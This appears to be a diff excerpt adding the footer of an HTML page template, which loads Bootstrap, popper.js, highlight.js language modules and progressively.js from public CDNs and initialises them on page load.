+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js" integrity="sha256-1zu+3BnLYV9LdiY85uXMzii3bdrkelyp37e0ZyTAQh0=" crossorigin="anonymous"></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/bash.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/css.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/diff.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/django.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/javascript.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/python.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/yaml.min.js" defer></script>
+        
+        <script>
+            window.addEventListener('load', function() {
+                hljs.initHighlighting();
+            }, true);
+        </script>
+    
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.js" integrity="sha256-LvFVlLdfGI3WeEH+8Ni4kxLm02g2GlOfeGCGLXfRk/U=" crossorigin="anonymous"></script>
+        <script>
+            window.addEventListener('load', function() {
+                progressively.init({delay: 30, throttle: 50});
+            }, true);
+        </script>
+    
+
+    
+
+    
+    
+</body>
+
+</html>
